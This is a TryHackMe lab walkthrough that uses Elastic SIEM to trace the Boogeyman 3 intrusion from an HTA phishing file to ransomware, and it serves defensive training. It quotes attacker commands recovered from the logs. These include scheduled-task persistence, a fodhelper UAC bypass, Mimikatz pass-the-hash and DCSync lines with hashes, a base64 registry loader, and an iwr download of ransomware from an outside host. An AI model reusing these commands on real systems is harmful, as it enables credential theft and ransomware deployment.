---
title: Boogeyman 3 Walkthrough
description: Investigate the final stage of the Boogeyman campaign using Elastic SIEM and Kibana.
pubDate: 2026-11-03
categories:
  - SOC
  - Walkthrough
  - TryHackMe
  - Network
tags:
  - Lessons
image: /image/networksecess.png
---
---
## Summary

In this final room of the Boogeyman series, we investigate the complete attack chain against Quick Logistics LLC using Elastic SIEM (Kibana). Starting from the initial spear-phishing HTA payload (`ProjectFinancialSummary_Q3.pdf.hta`) executed on CEO Evan Hutchinson's workstation (`WKSTN-0051`), we trace how the attacker implanted `review.dat`, created a scheduled task named `Review`, bypassed UAC via `fodhelper.exe`, dumped credentials with Mimikatz, harvested hardcoded credentials from a network share (`\\WKSTN-1327.quicklogistics.org\ITFiles\IT_Automation.ps1`), pivoted to `WKSTN-1327` and the Domain Controller (`DC01`), performed a DCSync attack against `backupda`, and finally deployed `ransomboogey.exe`.

---

**Learning Objectives**

- Investigate host and network telemetry inside Elastic SIEM (Kibana)
- Trace initial access, privilege escalation, credential dumping, and lateral movement
- Reconstruct the complete timeline of the Boogeyman attack chain

---
## Task 1.1
What is the PID of the process that executed the initial stage 1 payload?

**Answer**: `6392`

**Why?**
Searching Kibana Discover across the `winlogbeat-*` index for `ProjectFinancialSummary_Q3.pdf` returns 21 hits. Looking at the earliest Sysmon Process Create event at `Aug 29, 2023 @ 23:51:15.856`, `C:\Windows\SysWOW64\mshta.exe` executed `"C:\Windows\SysWOW64\mshta.exe" "D:\ProjectFinancialSummary_Q3.pdf.hta"` under `ProcessId: 6392`.

![](../../assets/Pasted%20image%2020261115181213.png)

## Task 1.2
The stage 1 payload attempted to implant a file to another location. What is the full command-line value of this execution?

**Answer**: `"C:\Windows\System32\xcopy.exe" /s /i /e /h D:\review.dat C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat`

**Why?**
Filtering by `process.parent.pid: 6392` and opening the `process.command_line` field visualization (filtering by parent command line) lists all 5 child processes spawned by the initial payload. We can see both the file copy command (`"C:\Windows\System32\xcopy.exe" /s /i /e /h D:\review.dat C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat`) and the subsequent `rundll32.exe` execution (`"C:\Windows\System32\rundll32.exe" D:\review.dat,DllRegisterServer`).

![](../../assets/Pasted%20image%2020261115181420.png)

![](../../assets/Pasted%20image%2020261115181405.png)

## Task 1.3
The implanted file was eventually used and executed by the stage 1 payload, and persistence was established via a PowerShell scheduled task. What is the command-line value of this execution?

**Answer**: `"C:\Windows\System32\rundll32.exe" D:\review.dat,DllRegisterServer` (and PowerShell persistence: `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" $A = New-ScheduledTaskAction -Execute 'rundll32.exe' -Argument 'C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat,DllRegisterServer'; $T = New-ScheduledTaskTrigger -Daily -At 06:00; $S = New-ScheduledTaskSettingsSet; $P = New-ScheduledTaskPrincipal $env:username; $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S; Register-ScheduledTask Review -InputObject $D -Force;`)

**Why?**
Querying `"*ScheduledTask*" and "*powershell*"` in Discover isolates the exact PowerShell process (`PID 6204`) spawned at `23:51:16.809` that registers a daily scheduled task to execute `rundll32.exe` with `C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat,DllRegisterServer`.

![](../../assets/Pasted%20image%2020261115181634.png)

![](../../assets/Pasted%20image%2020261115181804.png)

## Task 1.4
What is the name of the scheduled task created by the attacker for persistence?

**Answer**: `Review`

**Why?**
At the end of the PowerShell `process.command_line` value (`Register-ScheduledTask Review -InputObject $D -Force;`), the scheduled task is registered under the name `Review`.

![](../../assets/Pasted%20image%2020261115181836.png)

## Task 2.1
The execution of the implanted file inside the machine has initiated a potential C2 connection. What is the IP and port used by this connection? (format: IP:port)

**Answer**: `165.232.170.151:80`

**Why?**
Filtering for Sysmon network connections (`event.provider: "Microsoft-Windows-Sysmon" and event.code: "3"`) shows outbound HTTP connections initiated to `DestinationIp: 165.232.170.151` on `DestinationPort: 80`.

![](../../assets/Pasted%20image%2020261115181938.png)

## Task 2.2
Upon successfully establishing the C2 connection, the attacker attempted to bypass UAC to escalate privileges. What is the name of the binary used to bypass UAC?

**Answer**: `fodhelper.exe`

**Why?**
Searching Sysmon logs around `23:54:49` (`event.provider: "Microsoft-Windows-Sysmon" and "*review.dat*"`) reveals `C:\Windows\System32\fodhelper.exe` being executed by `evan.hutchinson` to achieve a High integrity level via UAC bypass.

![](../../assets/Pasted%20image%2020261115182032.png)

## Task 2.3
After successful privilege escalation, the attacker attempted to download a credential dumping tool from GitHub. What is the URL or command used to download the file?

**Answer**: `https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip`

**Why?**
Querying `"*github.com*" and NOT event.action: "Dns query (rule:DnsQuery)"` shows PowerShell executing `powershell.exe -c iwr https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -outfile mimi.zip`.

![](../../assets/Pasted%20image%2020261115182117.png)

## Task 2.4
Using the downloaded tool, the attacker performed a Pass-the-Hash attack to escalate to the `itadmin` account. What is the NTLM hash of `itadmin`?

**Answer**: `F84769D250EB95EB2D7D8B4A1C5613F2`

**Why?**
Searching for `"*mimikatz.exe*"` shows the command `"C:\Windows\Temp\m\x64\mimi\x64\mimikatz.exe" "sekurlsa::pth /user:itadmin /domain:QUICKLOGISTICS /ntlm:F84769D250EB95EB2D7D8B4A1C5613F2 /run:powershell.exe" exit` launched by `QUICKLOGISTICS\evan.hutchinson`.

![](../../assets/Pasted%20image%2020261115182313.png)

## Task 3.1
Using the `itadmin` context, the attacker accessed a file hosted on a network share. What is the name of the network share and PowerShell script accessed?

**Answer**: `ITFiles` / `IT_Automation.ps1` (`\\WKSTN-1327.quicklogistics.org\ITFiles\IT_Automation.ps1`)

**Why?**
Although starting with a broad manual search on `WKSTN-0051` was slower than filtering directly by command line, querying `host.name: "WKSTN-0051.quicklogistics.org" and powershell.exe and *file*` reveals PowerShell executing `cat FileSystem::\\WKSTN-1327.quicklogistics.org\ITFiles\IT_Automation.ps1` at `00:19:53.056`.

![](../../assets/Pasted%20image%2020261115182958.png)

![](../../assets/Pasted%20image%2020261115183007.png)

## Task 3.2
Inside the automation script, the attacker found hardcoded credentials for another domain user. What is the username and password used to pivot via `Invoke-Command`?

**Answer**: `allan.smith` / `Tr!ckyP@ssw0rd987`

**Why?**
Adding `process.command_line` as a selected column in the Discover table (`host.name: "WKSTN-0051.quicklogistics.org" and powershell.exe`) immediately exposes the command executed at `00:20:23`: `$credential = (New-Object PSCredential -ArgumentList ('QUICKLOGISTICS\allan.smith', (ConvertTo-SecureString 'Tr!ckyP@ssw0rd987' -AsPlainText -Force))) ; Invoke-Command -Credential $credential -ComputerName WKSTN-1327 -ScriptBlock {whoami}`.

![](../../assets/Pasted%20image%2020261115183305.png)

## Task 3.3
Which host did the attacker pivot to using `allan.smith`'s credentials?

**Answer**: `WKSTN-1327` (`WKSTN-1327.quicklogistics.org`)

**Why?**
Querying `allan.smith` and checking the top values of `host.name` shows `WKSTN-1327.quicklogistics.org` accounting for `98.2%` of the activity after the pivot from `WKSTN-0051.quicklogistics.org`.

![](../../assets/Pasted%20image%2020261115183420.png)
![](../../assets/Pasted%20image%2020261115183416.png)

## Task 3.4
On `WKSTN-1327`, the attacker established persistence by storing a Base64-encoded payload inside a registry key. What is the registry path used?

**Answer**: `HKLM:\Software\Microsoft\Network debug`

**Why?**
Filtering for process creation events on `WKSTN-1327` (`host.hostname: "WKSTN-1327" and event.provider: "Microsoft-Windows-Sysmon" and event.code: "1"`) reveals `taskhostw.exe` spawning `powershell.exe -NonI -W hidden -c "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))"`.

![](../../assets/Pasted%20image%2020261115183504.png)

## Task 3.5
The attacker then downloaded and executed Mimikatz on `WKSTN-1327` to dump credentials and perform Pass-the-Hash for the `administrator` account. What is the NTLM hash of `administrator`?

**Answer**: `00f80f2538dcb54e7adc715c0e7091ec`

**Why?**
Querying `host.hostname: "WKSTN-1327" and "*mimikatz*"` shows `"C:\Users\allan.smith\Documents\mimi\x64\mimikatz.exe" "sekurlsa::pth /user:administrator /domain:quicklogistics.org /ntlm:00f80f2538dcb54e7adc715c0e7091ec /run:powershell.exe" exit`.

![](../../assets/Pasted%20image%2020261115183535.png)

## Task 3.6
After moving laterally to the Domain Controller (`DC01`), the attacker used Mimikatz to perform a DCSync attack. Aside from `administrator`, which other account was targeted?

**Answer**: `backupda`

**Why?**
Filtering by `process.name: "mimikatz.exe"` across all hosts shows two `lsadump::dcsync` executions on `DC01`: one targeting `/user:administrator` and another at `01:47:57.809` executing `"C:\Users\Administrator\Documents\mimi\x64\mimikatz.exe" "lsadump::dcsync /domain:quicklogistics.org /user:backupda" exit`.

![](../../assets/Pasted%20image%2020261115183638.png)

## Task 3.7
Finally, the attacker deployed ransomware across the compromised hosts using PowerShell. What is the name of the ransomware executable (and the URL from which it was downloaded)?

**Answer**: `ransomboogey.exe` (`http://ff.sillytechninja.io/ransomboogey.exe`)

**Why?**
Querying `process.name: "powershell.exe" and "*WKSTN-1327*"` and then confirming with `process.name: "powershell.exe" and "*ransomboogey.exe*"` shows the attacker using `Invoke-Command` and `iwr http://ff.sillytechninja.io/ransomboogey.exe -outfile ransomboogey.exe` to download and execute `ransomboogey.exe` across `DC01`, `WKSTN-1327`, and `WKSTN-0051`.

![](../../assets/Pasted%20image%2020261115184040.png)

![](../../assets/Pasted%20image%2020261115184056.png)

---

## Personal Note: Boogeyman 3 Attack Chain & Kibana Hunting Tips

### 1. Full Attack Chain Summary (`WKSTN-0051` -> `WKSTN-1327` -> `DC01`)
1. **Initial Access (`WKSTN-0051`)**: User `evan.hutchinson` opens `D:\ProjectFinancialSummary_Q3.pdf.hta` via `mshta.exe` (`PID 6392`).
2. **Implant & Persistence**: Stage 1 copies `D:\review.dat` to `AppData\Local\Temp\review.dat` (`xcopy.exe`), executes it with `rundll32.exe D:\review.dat,DllRegisterServer`, and registers a daily scheduled task named `Review` (`Register-ScheduledTask`).
3. **C2 & Privilege Escalation**: The implant connects to `165.232.170.151:80`, bypasses UAC via `fodhelper.exe`, downloads Mimikatz from GitHub (`mimi.zip`), and uses Pass-the-Hash (`sekurlsa::pth`) to pivot to `itadmin`.
4. **Credential Harvesting & Lateral Movement**: As `itadmin`, the attacker reads `\\WKSTN-1327.quicklogistics.org\ITFiles\IT_Automation.ps1`, extracts hardcoded credentials (`allan.smith` / `Tr!ckyP@ssw0rd987`), and pivots to `WKSTN-1327` using `Invoke-Command`.
5. **Registry Persistence & Domain Escalation (`WKSTN-1327`)**: Stores a Base64 payload in `HKLM:\Software\Microsoft\Network debug`, dumps the `administrator` NTLM hash (`00f80f2538dcb54e7adc715c0e7091ec`) with Mimikatz, and moves to `DC01`.
6. **DCSync & Ransomware (`DC01`)**: Runs `lsadump::dcsync` against `administrator` and `backupda`, then uses `Invoke-Command` + `iwr` to deploy `ransomboogey.exe` across all hosts.

### 2. Practical Kibana Hunting Takeaways
- **Add `process.command_line` as a table column early**: Instead of expanding individual JSON documents one by one, adding `process.command_line` (and `process.parent.command_line`) as selected fields in Discover makes thousands of PowerShell events scannable in seconds.
- **Pivot on `process.parent.pid`**: Once you find an initial access binary (`mshta.exe`, `PID 6392`), filtering by `process.parent.pid: 6392` and clicking **Visualize** on `process.command_line` immediately reveals every child command spawned by the payload.
- **Filter out DNS noise when hunting downloads**: When searching for domains like `"*github.com*"`, append `and NOT event.action: "Dns query (rule:DnsQuery)"` so you jump straight to the PowerShell `iwr` command line and Sysmon Event ID 3 network connections.